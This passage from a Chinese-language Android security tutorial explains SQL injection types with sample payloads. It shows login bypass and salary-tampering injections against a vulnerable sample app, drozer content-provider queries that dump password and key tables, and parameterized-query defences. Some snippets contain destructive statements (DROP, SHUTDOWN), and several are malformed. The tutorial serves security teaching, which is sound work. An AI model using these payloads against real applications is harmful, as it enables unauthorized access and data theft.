class=\"number\">1</span>))=可用ASCII码值,sleep(<span class=\"number\">2</span>),<span class=\"number\">0</span>) <span class=\"comment\">//使用if函数，从第S位开始截取一位，逐一猜解数据库名，可用ASCII码值范围为48-122</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(length(select table_name from information_schema.tables where table_schema=database() limit <span class=\"number\">3</span>,<span class=\"number\">1</span>)=数字,sleep(<span class=\"number\">2</span>),<span class=\"number\">0</span>) <span class=\"comment\">//逐一猜解数据库第4个表长度，第1个表从0开始</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit <span class=\"number\">3</span>,<span class=\"number\">1</span>),s,<span class=\"number\">1</span>))=可用ASCII码值,sleep(<span class=\"number\">2</span>),<span class=\"number\">0</span>) <span class=\"comment\">//逐一猜解数据库第4个表表名</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//逐一猜解列名、数据</span></span><br></pre></td></tr></table></figure>\n\n<p>SQL注入的常见分类如上所述，由于本文主要针对Android上SQL注入讲解，这里就不再深入研究，这里引用博客：<a href=\"https://www.modb.pro/db/163732\">SQL注入漏洞分析</a>，要深入了解朋友可以看原作者博客，里面还有一些案例讲解。</p>\n<h3 id=\"3-SQL常见注入技巧\"><a href=\"#3-SQL常见注入技巧\" class=\"headerlink\" title=\"3.SQL常见注入技巧\"></a>3.SQL常见注入技巧</h3><p>前面我们已经了解了SQL注入的基本分类，下面我们介绍一些SQL注入实际的测试技巧：</p>\n<h4 id=\"（1）重言式攻击\"><a href=\"#（1）重言式攻击\" class=\"headerlink\" title=\"（1）重言式攻击\"></a>（1）重言式攻击</h4><p>重言式攻击通过一个或多个条件SQL语句查询注入代码，使SQL命令计算为真条件，如(1&#x3D;1)或（–）。一般可以用来绕过身份验证</p>\n<p>例如：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Select * from table <span class=\"type\">where</span> <span class=\"variable\">table_ID</span> <span class=\"operator\">=</span> <span class=\"string\">&#x27;1&#x27;</span> or <span class=\"string\">&#x27;1=1&#x27;</span>--<span class=\"string\">&#x27;AND table_password=&#x27;</span><span class=\"number\">1234</span><span class=\"string\">&#x27;;</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（2）Piggy-backed查询\"><a href=\"#（2）Piggy-backed查询\" class=\"headerlink\" title=\"（2）Piggy-backed查询\"></a>（2）Piggy-backed查询</h4><p>Piggy-backed Queries是一种攻击，它使用查询分隔符（如“；”）向原始查询注入额外的查询语句，从而危及数据库。 在这种方法中，第一个查询是原始的，而随后的查询是注入的。 这次攻击是非常危险的</p>\n<p>例如：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT pass FROM userTable WHEREuser_ld=<span class=\"string\">&#x27;user1&quot; AND Password = 0; drop userTable</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（3）逻辑错误\"><a href=\"#（3）逻辑错误\" class=\"headerlink\" title=\"（3）逻辑错误\"></a>（3）逻辑错误</h4><p>逻辑错误攻击利用数据库为错误查询返回的错误消息，这些数据库错误消息通常包含有用的信息，使攻击者能够发现应用程序和数据库架构中的易受攻击的参数。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT*FROM userTable WHEREuser_ld=’<span class=\"number\">1111</span>’ AND password=<span class=\"string\">&#x27;1234’ AND CONVERT(char, no)</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（4）联合查询\"><a href=\"#（4）联合查询\" class=\"headerlink\" title=\"（4）联合查询\"></a>（4）联合查询</h4><p>联合查询注入称为语句注入攻击。 在此攻击中，攻击者在原始SQL语句中插入附加语句。 此攻击可以通过在Vulnerable参数中插入UNION查询或“；<SQL Statement>”形式的语句来完成。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT* FROM userTable WHEREuser_ld=<span class=\"number\">1111</span><span class=\"string\">&#x27;UNION SELECT *FROMmemberTable WHERE member_ld=&#x27;</span>admin<span class=\"string\">&#x27;--&#x27;</span> AND password=<span class=\"string\">&#x27;1234&#x27;</span>;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（5）存储过程\"><a href=\"#（5）存储过程\" class=\"headerlink\" title=\"（5）存储过程\"></a>（5）存储过程</h4><p>在该技术中，攻击者主要关注数据库系统中存在的存储过程。 存储过程直接由数据库引擎运行。 它是一段可利用的代码。 存储过程为授权或未经授权的客户端提供true或false值。 对于SQLIA，攻击者将写入“； 关机； –“使用登录名或密钥。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT Username FROM UserTableWHEREuser_name= <span class=\"string\">&quot;user1&quot;</span> AND pass=<span class=\"string\">&quot; &quot;</span>; SHUTDOWN;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（6）推断攻击\"><a href=\"#（6）推断攻击\" class=\"headerlink\" title=\"（6）推断攻击\"></a>（6）推断攻击</h4><p>利用推断攻击，攻击者可以改变数据库或应用程序的行为。 这种类型的攻击可以分为两种著名的技术，它们是：盲注入和定时攻击</p>\n<h5 id=\"lt-1-gt-盲注入\"><a href=\"#lt-1-gt-盲注入\" class=\"headerlink\" title=\"&lt;1&gt;盲注入\"></a>&lt;1&gt;盲注入</h5><p>当程序员忘记隐藏导致数据库应用程序不安全的错误消息时，就会发生这种类型的SQLIA，这种错误消息通过SQL语句询问一系列逻辑问题来帮助SQLIA危及数据库。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT pass FROM userTable WHERE username=<span class=\"string\">&#x27;user&#x27;</span> and <span class=\"number\">1</span> =<span class=\"number\">0</span> -- <span class=\"type\">AND</span> <span class=\"variable\">pass</span> <span class=\"operator\">=</span> AND pin= <span class=\"number\">0</span></span><br><span class=\"line\">SELECT info FROM userTable WHERE username=<span class=\"string\">&#x27;user&#x27;</span> and = <span class=\"number\">1</span> -- <span class=\"type\">AND</span> <span class=\"variable\">pass</span> <span class=\"operator\">=</span> AND pass= <span class=\"number\">0</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"lt-2-gt-定时攻击\"><a href=\"#lt-2-gt-定时攻击\" class=\"headerlink\" title=\"&lt;2&gt;定时攻击\"></a>&lt;2&gt;定时攻击</h5><p>这种类型的攻击允许攻击者通过观察数据库响应中的定时延迟来从数据库中收集信息。 这类攻击利用if条件语句来达到延时的目的。 WAITFOR是分支上的关键字，它导致数据库将其响应延迟指定的时间。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">declare @ varchar (<span class=\"number\">8000</span>) select <span class=\"meta\">@s</span> =db_name (<span class=\"keyword\">if</span> (ascii (substring (<span class=\"meta\">@s</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>))&amp;(power (<span class=\"number\">2</span>,o) &gt; o waitfor delay <span class=\"string\">&#x27;0:0:5&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（7）交替编码\"><a href=\"#（7）交替编码\" class=\"headerlink\" title=\"（7）交替编码\"></a>（7）交替编码</h4><p>当攻击者通过使用替代编码（如十六进制、ASCII和Unicode）修改注入查询时，就会发生此类攻击。 通过这种方式，攻击者可以逃离开发人员的过滤器，该过滤器扫描输入查询以查找特定的已知“坏字符”。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT accounts FROM userTable WHERE login=<span class=\"string\">&quot;AND pin=0; exec (char(0x73687574646f776e)</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-Andorid-APP-SQL漏洞常见的测试点\"><a href=\"#4-Andorid-APP-SQL漏洞常见的测试点\" class=\"headerlink\" title=\"4.Andorid APP SQL漏洞常见的测试点\"></a>4.Andorid APP SQL漏洞常见的测试点</h3><p>Android APP SQL注入漏洞一般位于APP的用户登录，充值页面，修改银行卡，提交留言反馈，商品购买，提现功能等地方</p>\n<h2 id=\"三、常见的SQL漏洞\"><a href=\"#三、常见的SQL漏洞\" class=\"headerlink\" title=\"三、常见的SQL漏洞\"></a>三、常见的SQL漏洞</h2><p>这里我们使用一个漏洞样本来详细的讲解APP SQL注入漏洞的情况</p>\n<h3 id=\"1-重言式攻击\"><a href=\"#1-重言式攻击\" class=\"headerlink\" title=\"1.重言式攻击\"></a>1.重言式攻击</h3><h4 id=\"（1）漏洞原理\"><a href=\"#（1）漏洞原理\" class=\"headerlink\" title=\"（1）漏洞原理\"></a>（1）漏洞原理</h4><p>我们前面讲了，可以使用<code>(1=1)或（--）</code>来绕过身份验证，我们知道一般SQL语句登录构造如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Select * From 用户表 Where UserName=xxx and Password=xxx</span><br></pre></td></tr></table></figure>\n\n<p>然后判断返回的行数，如果有返回行，证明账号和密码是正确的，即登录成功，而这样的语句的话</p>\n<p>那么我们可以在登录账户或密码后面加上<code>（1=1）</code>，因为1&#x3D;1登录条件永远成立，而<code>--</code>作为内嵌评论的开始字符，会导致后面内容只作为评论，这样就可以不去验证密码的有效性</p>\n<h4 id=\"（2）漏洞复现\"><a href=\"#（2）漏洞复现\" class=\"headerlink\" title=\"（2）漏洞复现\"></a>（2）漏洞复现</h4><p>我们打开应用</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/2.png\" alt=\"image-20220710153441324\"></p>\n<p>这里很显然是一个登录界面，APP会通过用户输入的账号和密码，去查询数据库中用户进行匹配，我们进一步进行静态分析</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/3.png\" alt=\"image-20220710153652015\"></p>\n<p>不难找到这句语句是APP进行数据库查询的语句，我们可以进行进一步分析</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/4.png\" alt=\"image-20220710153916860\"></p>\n<p>不难发现这里我们如果在不知道密码情况下，随意输入，APP会根据账号和密码构造一个有效的负载来避免检测</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot; WHERE NAME=&#x27;&quot; <span class=\"operator\">+</span> username <span class=\"operator\">+</span> &quot;&#x27; AND PASSWORD=&#x27;&quot; <span class=\"operator\">+</span> password <span class=\"operator\">+</span> &quot;&#x27;&quot;</span><br></pre></td></tr></table></figure>\n\n<p>因此我们可以使用<code>（1=1）</code>和<code>--</code>两种方式来进行sql注入绕过验证</p>\n<p><code>--</code></p>\n<p>我们使用<code>--</code>来构造语句，无非是使得不会去检测密码的有效性，所以我们可以构造语句</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"operator\">*</span> <span class=\"keyword\">FROM</span> employee <span class=\"keyword\">WHERE</span> NAME<span class=\"operator\">=</span><span class=\"string\">&#x27;Admin&#x27;</span> <span class=\"comment\">-- AND PASSWORD = &#x27;xyz&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>这样会是的我们将查询语句构造成上面语句，APP就不会去验证密码，而我们又输入的是管理员账号，所以可以尝试进行sql注入绕过</p>\n<p>构造账号和密钥：账号<code>Admin&#39; --</code> 密钥：<code>Anything</code></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/5.png\" alt=\"image-20220710154643896\"></p>\n<p>这样就成功的绕过了验证，获得具体信息</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/6.png\" alt=\"image-20220710154806710\"></p>\n<p>我们还可以查询账号密钥相应的详细</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/7.png\" alt=\"image-20220710154852745\"></p>\n<p>同理我们使用（1&#x3D;1）方式来进行注入</p>\n<p><code>1=1</code></p>\n<p>我们使用<code>1=1</code>来进行注入，无非是相在输入账户情况下，可以输入任意的密码，这样我们只需要使用(OR <code>&#39;1&#39;=&#39;1&#39;</code>)即可</p>\n<p>可以构造SQL语句：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"operator\">*</span> <span class=\"keyword\">FROM</span> employee <span class=\"keyword\">WHERE</span> NAME<span class=\"operator\">=</span><span class=\"string\">&#x27;Admin&#x27;</span> <span class=\"keyword\">OR</span> <span class=\"string\">&#x27;1&#x27;</span><span class=\"operator\">=</span><span class=\"string\">&#x27;1&#x27;</span> <span class=\"keyword\">AND</span> PASSWORD <span class=\"operator\">=</span> <span class=\"string\">&#x27;anything&#x27;</span> <span class=\"keyword\">OR</span> <span class=\"string\">&#x27;1&#x27;</span><span class=\"operator\">=</span><span class=\"string\">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>构造账号和密钥：账号：<code>Admin&#39; OR &#39;1&#39;=&#39;1</code> 密钥：<code>anything&#39; OR &#39;1&#39;=&#39;1</code></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/8.png\" alt=\"image-20220710155537289\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/9.png\" alt=\"image-20220710155557758\"></p>\n<p>同理成功进入 上面账号和密码可以为任意值</p>\n<h3 id=\"2-Piggy-backed查询\"><a href=\"#2-Piggy-backed查询\" class=\"headerlink\" title=\"2.Piggy-backed查询\"></a>2.Piggy-backed查询</h3><h4 id=\"（1）漏洞原理-1\"><a href=\"#（1）漏洞原理-1\" class=\"headerlink\" title=\"（1）漏洞原理\"></a>（1）漏洞原理</h4><p>我们上面已经简单的绕过了该攻击，我们可以使用<code>;</code>来进行Piggy-backed查询，这样可以使得在登录系统的同时，再进行执行一条SQL语句</p>\n<h4 id=\"（2）漏洞复现-1\"><a href=\"#（2）漏洞复现-1\" class=\"headerlink\" title=\"（2）漏洞复现\"></a>（2）漏洞复现</h4><p>我们可以构造SQL语句：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"operator\">*</span> <span class=\"keyword\">FROM</span> employee <span class=\"keyword\">WHERE</span> NAME<span class=\"operator\">=</span><span class=\"string\">&#x27;anyname&#x27;</span> <span class=\"keyword\">OR</span> <span class=\"string\">&#x27;1&#x27;</span><span class=\"operator\">=</span><span class=\"string\">&#x27;1&#x27;</span>;<span class=\"keyword\">INSERT</span> <span class=\"keyword\">INTO</span> employee (NAME, ID) <span class=\"keyword\">VALUES</span> (<span class=\"string\">&#x27;MUR&#x27;</span>,<span class=\"string\">&#x27;11451&#x27;</span>) <span class=\"comment\">-- AND PASSWORD = &#x27;anything&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>上面的语句实现三个功能：构造任意的用户名，插入新的sql语句，使得验证码无效</p>\n<p>构造用户名和密码：用户名：<code>anyname&#39; OR &#39;1&#39;=&#39;1&#39;; INSERT INTO employee (NAME, ID) VALUES (&#39;MUR&#39;,&#39;11451&#39;) --</code> 密码：<code>anything</code></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/10.png\" alt=\"image-20220710161338483\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/11.png\" alt=\"image-20220710161653071\"></p>\n<p>这里我们发现成功的登录，但是并没有插入用户名成功，经过分析，在大多数<a href=\"https://developer.android.com/reference/android/database/sqlite/SQLiteDatabase.html#execSQL(java.lang.String)\">SQLiteDatabase API</a>中<code>;</code>被定义为终止，所以它之后的任何内容都应该被忽略，但是这也是在一些APP中可以进行测试的环节，当我们理解<code>;</code>作用后，很明显我们又可以得到一种绕过登录的方法，这里既然<code>;</code>后面都无效，是不是意味，我们只要输入正确账户，就可以登录</p>\n<p>构造SQL语句：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"operator\">*</span> <span class=\"keyword\">FROM</span> employee <span class=\"keyword\">WHERE</span> NAME<span class=\"operator\">=</span><span class=\"string\">&#x27;Admin&#x27;</span>;  <span class=\"keyword\">AND</span> PASSWORD <span class=\"operator\">=</span> <span class=\"string\">&#x27;anything&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>构造账号和密码：账号<code>Admin&#39;;</code>，密码：<code>Anything</code> </p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/12.png\" alt=\"image-20220710162127368\"></p>\n<p>同样成功登录</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/13.png\" alt=\"image-20220710162156625\"></p>\n<h3 id=\"3-逻辑错误攻击\"><a href=\"#3-逻辑错误攻击\" class=\"headerlink\" title=\"3.逻辑错误攻击\"></a>3.逻辑错误攻击</h3><h4 id=\"（1）漏洞原理-2\"><a href=\"#（1）漏洞原理-2\" class=\"headerlink\" title=\"（1）漏洞原理\"></a>（1）漏洞原理</h4><p>原本逻辑错误攻击是利用数据库为错误查询返回的错误消息，这些数据库错误消息通常包含有用的信息，使攻击者能够发现应用程序和数据库架构中的易受攻击的参数。而我们这里发现在数据字段校验时，通过插入多余的字段，来实现越权的功能</p>\n<h4 id=\"（2）漏洞复现-2\"><a href=\"#（2）漏洞复现-2\" class=\"headerlink\" title=\"（2）漏洞复现\"></a>（2）漏洞复现</h4><p>这里我们分析到数据库更新的语句</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/14.png\" alt=\"image-20220710163213985\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/15.png\" alt=\"image-20220710163233575\"></p>\n<p>通过这里的更新语句我们可以很明显的得到构造的SQL</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">UPDATE</span> employee <span class=\"keyword\">SET</span> NICKNAME<span class=\"operator\">=</span>..., EMAIL <span class=\"operator\">=</span>..., ADDRESS<span class=\"operator\">=</span>..., PASSWORD <span class=\"operator\">=</span>..,               PHONE<span class=\"operator\">=</span><span class=\"string\">&#x27;...&#x27;</span> <span class=\"keyword\">WHERE</span> ID <span class=\"operator\">=</span> (...)</span><br></pre></td></tr></table></figure>\n\n<p>这里我们模拟一般的管理系统，很显然只能管理员对员工的一些信息进行修改，比如薪资，而员工只能修改一般的字段，我们这里通过普通用户模式登陆</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/16.png\" alt=\"image-20220710163736745\"></p>\n<p>可以很明显发现，这里的薪资是无法进行修改的，那我们通过添加字段利用逻辑错误来实现修改</p>\n<p>构造SQL:</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">UPDATE</span> employee <span class=\"keyword\">SET</span> NICKNAME<span class=\"operator\">=</span>..., EMAIL <span class=\"operator\">=</span>..., ADDRESS<span class=\"operator\">=</span>..., PASSWORD <span class=\"operator\">=</span>..,               PHONE<span class=\"operator\">=</span><span class=\"string\">&#x27;21389&#x27;</span>, SALARY<span class=\"operator\">=</span><span class=\"string\">&#x27;100000000&#x27;</span> </span><br><span class=\"line\"><span class=\"keyword\">WHERE</span> ID <span class=\"operator\">=</span> (Alice.id)</span><br></pre></td></tr></table></figure>\n\n<p>我们这里修改Phone的字段：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">21389</span><span class=\"string\">&#x27;, SALARY=&#x27;</span><span class=\"number\">100000000</span></span><br></pre></td></tr></table></figure>\n\n<p>这样就多加了一个字段，但是我们对上面代码逻辑进行分析，发现只是对字符串进行读取，并未校验</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/17.png\" alt=\"image-20220710164102899\"></p>\n<p>点击更新</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/18.png\" alt=\"image-20220710164124887\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/19.png\" alt=\"image-20220710164202529\"></p>\n<p>再次进入我们就发现薪资变为了我们预设的数字</p>\n<p>当然利用上面的实现我们还能修改用户名，比如：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">UPDATE</span> employee <span class=\"keyword\">SET</span> NICKNAME<span class=\"operator\">=</span>..., EMAIL <span class=\"operator\">=</span>..., ADDRESS<span class=\"operator\">=</span>..., PASSWORD <span class=\"operator\">=</span>..,               PHONE<span class=\"operator\">=</span><span class=\"string\">&#x27;21389&#x27;</span>, SALARY<span class=\"operator\">=</span><span class=\"number\">100000000</span></span><br><span class=\"line\"><span class=\"keyword\">WHERE</span> NAME <span class=\"operator\">=</span> <span class=\"string\">&#x27;Boby&#x27;</span> <span class=\"comment\">-- &#x27; WHERE ID = (Alice.id)</span></span><br></pre></td></tr></table></figure>\n\n<p>我们构造语句：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">21389</span><span class=\"string\">&#x27;, SALARY=10000000 WHERE NAME=&#x27;</span>Bobby<span class=\"string\">&#x27; --</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/20.png\" alt=\"image-20220710165113539\"></p>\n<p>更新成功后，我们进入Bobby的信息，发现就被修改了</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/21.png\" alt=\"image-20220710165227929\"></p>\n<h3 id=\"4-漏洞的挖掘思路\"><a href=\"#4-漏洞的挖掘思路\" class=\"headerlink\" title=\"4.漏洞的挖掘思路\"></a>4.漏洞的挖掘思路</h3><p>我们前面讲了三种常见类型的SQL注入的案例，但是我们在实际挖掘过程中，怎么初步的判断是否存在这类漏洞，并进行使用</p>\n<p>我们打开另外一个样本APK</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/25.png\" alt=\"image-20220710171128029\"></p>\n<p>我们知道并不是所有APK样本，我们都能很轻易的获得源码，有些可能使用了加壳服务，但是测试上述的漏洞很容易</p>\n<p>我们都知道SQL注入需要单引号配对，我们可以根据日志和错误提示来查看</p>\n<p>首先我们先进行日志监听或使用ddms</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">adb logcat |grep packagename</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/26.png\" alt=\"image-20220710171544841\"></p>\n<p>然后我们输入一个单引号<code>&#39;</code></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/27.png\" alt=\"image-20220710171759976\"></p>\n<p>很明显说明这里是存在SQL注入，说明程序是有从Sqlite中获取信息，但由于我们输入<code>&#39;</code>引号，没有配对，导致程序错误</p>\n<p>然后我们再输入双引号<code>&#39;&#39;</code></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/28.png\" alt=\"image-20220710172000010\"></p>\n<p>程序正在搜索输入的数据，没有产生SQL错误。为了进一步确认，我们再加一个单引号，看看是否会引发SQL错误</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/29.png\" alt=\"image-20220710172107288\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/30.png\" alt=\"image-20220710172135897\"></p>\n<p>程序再次报错，说明奇数个<code>&#39;</code>会导致SQL错误，当引号刚好匹配时SQL查询正好会执行</p>\n<p>然后我们就可以使用我们上面的漏洞来进行测试，我们使用一个万能语句，即无论正确错误都输入的语句</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span><span class=\"string\">&#x27; or &#x27;</span><span class=\"number\">1</span><span class=\"string\">&#x27; !=&#x27;</span><span class=\"number\">2</span></span><br></pre></td></tr></table></figure>\n\n<p>无论是ture还是flase我们都满足，即万能语句</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/31.png\" alt=\"image-20220710172419976\"></p>\n<p>这里我们就成功的爆出了相关信息</p>\n<p>这里很显然是app接收了用户的输入，没有经过验证就直接加入到SQL查询语句</p>\n<h3 id=\"5-安全防护\"><a href=\"#5-安全防护\" class=\"headerlink\" title=\"5.安全防护\"></a>5.安全防护</h3><p>针对1-3的漏洞现象，样本中依次进行了安全防护</p>\n<p><strong>针对1-2的防护：</strong></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/22.png\" alt=\"image-20220710165651424\"></p>\n<p>上图中2表示防护的代码</p>\n<p><strong>针对3的防护：</strong></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/23.png\" alt=\"image-20220710165822151\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/24.png\" alt=\"image-20220710165913808\"></p>\n<p>我们可以发现上传的防护方式，都使用了<code>?</code>, 问号<code>?</code>是 SQL 查询中的参数持有者，将使用 String ListArray 中给出的相应参数进行编译，即会对输入的参数进行转义和绑定，这样就可以有效的进行参数输入防护</p>\n<h2 id=\"四、Content-Provider上Sql注入漏洞\"><a href=\"#四、Content-Provider上Sql注入漏洞\" class=\"headerlink\" title=\"四、Content Provider上Sql注入漏洞\"></a>四、Content Provider上Sql注入漏洞</h2><p>我在<a href=\"https://bbs.pediy.com/thread-269447.htm\">Android APP漏洞之战（4）——Content漏洞详解</a>已经初步介绍了Content Provider中存在的sql注入漏洞，我们知道Android中provider提供不同进程之间共享内容，而content在查询的过程中也会存在一些典型的Sql注入漏洞</p>\n<h3 id=\"1-漏洞原理\"><a href=\"#1-漏洞原理\" class=\"headerlink\" title=\"1.漏洞原理\"></a>1.漏洞原理</h3><p>Content Provider SQL注入漏洞产生的因如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Content Provider组件是可导出的未校验输入值是否符舍规范，就作为SQL语句的一部分，例如：</span><br><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">inputUserName</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;123&#x27;or&#x27;1=1&quot;</span>;</span><br><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">inputPassword</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;123&quot;</span>;</span><br><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">sql</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;select *from user where username=&#x27;&quot;</span>+inputUserName +<span class=\"string\">&quot;&#x27; and password=&#x27;&quot;</span>+inputPassword+<span class=\"string\">&quot;&#x27;&quot;</span>;</span><br><span class=\"line\"><span class=\"type\">Cursor</span> <span class=\"variable\">cursor</span> <span class=\"operator\">=</span> db.rawQuery(sql);</span><br><span class=\"line\">以上两点均满足的情况下，就会产生SQL注入风险</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-漏洞检测\"><a href=\"#2-漏洞检测\" class=\"headerlink\" title=\"2.漏洞检测\"></a>2.漏洞检测</h3><p>我们挖掘Content Provider漏洞的步骤：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）扫描全局代码，是否存在导出的Content Provider组件</span><br><span class=\"line\">（2）若存在导出的Content Provider组件，则判断SQL语句中是否有未校验的输入值，若存在则存在风险。</span><br><span class=\"line\">（3）汇总结果</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-漏洞复现\"><a href=\"#3-漏洞复现\" class=\"headerlink\" title=\"3.漏洞复现\"></a>3.漏洞复现</h3><p>我们使用drozer扫描注入的位置：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">run scanner.provider.injection -a &lt;包名&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/32.png\" alt=\"image-20220710165913808\"></p>\n<p>然后我们执行以下命令，发现返回了报错信息，接着构造sql获取敏感数据</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">run app.provider.query content:<span class=\"comment\">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;&#x27;&quot;</span></span><br><span class=\"line\">run app.provider.query content:<span class=\"comment\">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot; * from Key;--+&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/33.png\" alt=\"image-20220710165913808\"></p>\n<p>列出所有表信息：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">run app.provider.query content:<span class=\"comment\">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM SQLITE_MASTER WHERE type=&#x27;table&#x27;;--&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/34.png\" alt=\"image-20220710165913808\"></p>\n<p>获取具体表信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM Key;--&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/35.png\" 